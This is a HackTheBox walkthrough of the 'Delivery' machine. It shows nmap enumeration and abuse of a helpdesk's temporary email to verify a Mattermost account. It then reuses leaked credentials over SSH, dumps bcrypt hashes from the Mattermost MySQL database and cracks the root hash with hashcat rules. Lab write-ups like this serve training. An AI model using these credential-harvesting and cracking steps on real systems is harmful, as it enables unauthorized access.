@@ -1,0 +1,243 @@
+#  Devlivery
+
+![[Pasted image 20210525213621.png]]
+
+Delievery is an easy rated machine on HackTheBox created by [ippsec](https://www.hackthebox.eu/home/users/profile/3769). In this walkthrough we will first abuse a logic flaw in 2 webapplications that let's us use a temporary email address in a ticket system to recieve an email veryification for a running mattermost installation. Being loggend into mattermost we get some valuable information in a chat log which we use to get to the first user. For the root part we will will find some database credentials, which we use to get password hashes. Finally we will crack one of the hashes with a hashcat rule and log into the root account.
+
+## User
+
+### Nmap
+
+We start our enumeration on the box with a nmap scan against all ports to not miss something. Followed by a version detection and script scan against the open ports.
+
+###### All ports scan
+
+```sh
+$ sudo nmap -p- 10.129.130.9
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 08:28 CEST
+Nmap scan report for 10.129.130.9
+Host is up (0.031s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8065/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 37.25 seconds
+```
+
+###### Script/version scan
+
+```sh
+$ sudo nmap -p 22,80,8065 -sC -sV 10.129.130.9
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 08:30 CEST          
+Nmap scan report for 10.129.130.9
+Host is up (0.026s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)     
+| ssh-hostkey:
+|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)            
+|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)           
+|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)         
+80/tcp   open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome
+8065/tcp open  unknown
+| fingerprint-strings:
+|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8          
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK                  
+|     Accept-Ranges: bytes
+|     Cache-Control: no-cache, max-age=31556926, public
+|     Content-Length: 3108
+|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
+|     Content-Type: text/html; charset=utf-8
+|     Last-Modified: Tue, 13 Apr 2021 06:22:56 GMT
+|     X-Frame-Options: SAMEORIGIN
+|     X-Request-Id: czoo3jzua7gx5gsm4k369b98my
+|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
+|     Date: Tue, 13 Apr 2021 06:30:48 GMT
+|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" co
+ntent="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Date: Tue, 13 Apr 2021 06:30:48 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8065-TCP:V=7.91%I=7%D=4/13%Time=60753A6F%P=x86_64-pc-linux-gnu%r(Ge
+...[snip]...
+SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
+SF:);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 93.25 seconds
+```
+
+### Web
+
+On the website we get greeted with a message stating we should check out the helpdesk for all email related support.
+
+![[Pasted image 20210413083822.png]]
+
+Clicking on the link leads to `heldesk.delivery.htb`, wich of course does not resolve, so we add it to our `/etc/hosts` file.
+Going there we see a ticket support center where we can create tickets and check the status of them.
+
+![[Pasted image 20210413084335.png]]
+
+On port 8065 is a mattermost application where we can login creating an account with a valid email. The goal here is to log into mattermost. We will do this in multiple steps.
+
+![[Pasted image 20210413084602.png]]
+
+In a first step we create a ticket on the helpdesk
+
+![[Pasted image 20210413085111.png]]
+
+Registering the ticket we get a temporary email adress to send additional information.
+
+![[Pasted image 20210413093030.png]]
+
+Using this email to sign up to Mattermost, we can now retrieve the confirmation e-mail in the check ticket status tab and use the verification link for Mattermost.
+
+![[Pasted image 20210413093206.png]]
+
+![[Pasted image 20210413093229.png]]
+
+Logged into mattermost there is an interesting conversation in the `Internal` channel between `System` and `root`. In the conversation there are the credentials `maildeliverer:Youve_G0t_Mail!` and it is also hinting that the password `PleaseSubscribe!` might be reused throughout the machine.
+
+![[Pasted image 20210413093906.png]]
+
+With the credentials we can log in with ssh as the user maildeliverer and are greeted with the userflag. 
+
+```sh
+$ ssh maildeliverer@10.129.130.9
+The authenticity of host '10.129.130.9 (10.129.130.9)' can't be established.
+ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.130.9' (ECDSA) to the list of known hosts.
+maildeliverer@10.129.130.9's password: 
+Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
+maildeliverer@Delivery:~$ ls
+user.txt
+maildeliverer@Delivery:~$
+```
+
+## Root
+
+### Mysql
+
+Looking around we find the database credentials for mattermost in the file `/opt/mattermost/config/config.json`
+
+```vim
+    "SqlSettings": {
+        "DriverName": "mysql",
+        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
+        "DataSourceReplicas": [],
+        "DataSourceSearchReplicas": [],
+        "MaxIdleConns": 20,
+        "ConnMaxLifetimeMilliseconds": 3600000,
+        "MaxOpenConns": 300,
+        "Trace": false,
+        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
+        "QueryTimeout": 30,
+        "DisableDatabaseSearch": false
+    },
+```
+
+The password for the account is a hint for the next steps to take. 
+
+First we log into mysql to retrieve the usernames and passwords from the `mattermost.Users` table.
+
+```sql
+maildeliverer@Delivery:/$ mysql -u mmuser -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 181
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> select username, password from mattermost.Users;
++----------------------------------+--------------------------------------------------------------+
+| username                         | password                                                     |
++----------------------------------+--------------------------------------------------------------+
+| surveybot                        |                                                              |
+| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
+| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
+| grem                             | $2a$10$yvZ.J0XP.bJ8gDt890oBnOQRsO/uc.3ePEPo54FScoNqEjS6NSLVC |
+| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
+| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
+| channelexport                    |                                                              |
+| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
++----------------------------------+--------------------------------------------------------------+
+8 rows in set (0.001 sec)
+
+MariaDB [(none)]> ```
+```
+
+Following the 2 earlier hints, we are particularly interested in the root hash in combination with variations of the password `PleaseSubscribe!`.
+
+
+### Hashcat
+
+With the predefined `best64.rule` hashcat rule we are able to crack the password of the account in a short amount of time.
+
+```sh
+$ cat hash 
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
+```
+
+```sh
+$ hashcat -m 3200 -O hash pw -r /usr/share/hashcat/rules/best64.rule
+hashcat (v6.1.1) starting...
+...[snip]...
+$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21  
+
+Session..........: hashcat  
+Status...........: Cracked                
+Hash.Name........: bcrypt $2\*$, Blowfish (Unix)
+Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
+Time.Started.....: Tue Apr 13 10:05:14 2021 (1 sec)           
+Time.Estimated...: Tue Apr 13 10:05:15 2021 (0 secs)    
+Guess.Base.......: File (pw)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       23 H/s (2.61ms) @ Accel:2 Loops:64 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 21/77 (27.27%)                             
+Rejected.........: 0/21 (0.00%)                         
+Restore.Point....: 0/1 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:960-1024
+Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21
+
+Started: Tue Apr 13 10:05:12 2021
+Stopped: Tue Apr 13 10:05:16 2021
+```
+     
+With this password we can now switch to the root user on the machine and grab the rootflag.
+
+```sh
+maildeliverer@Delivery:/$ su root
+Password: 
+root@Delivery:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Delivery:/# wc -c /root/root.txt 
+33 /root/root.txt
+root@Delivery:/#
+```
